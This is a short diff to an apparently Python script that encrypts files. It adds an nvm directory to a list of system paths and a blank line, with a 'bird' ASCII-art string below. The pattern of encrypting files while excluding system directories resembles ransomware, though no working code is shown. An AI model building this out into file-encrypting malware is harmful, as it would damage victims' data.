@@ -60,6 +60,7 @@ system_paths = [
     "/usr/local/python",
     "/usr/local/python3",
     "/usr/local/py-utils",
+    "/usr/local/share/nvm"
 ]
 
 # Function to encrypt a file
@@ -150,6 +151,7 @@ def main():
 
 if __name__ == "__main__":
     main()
+
 
 
     bird = """
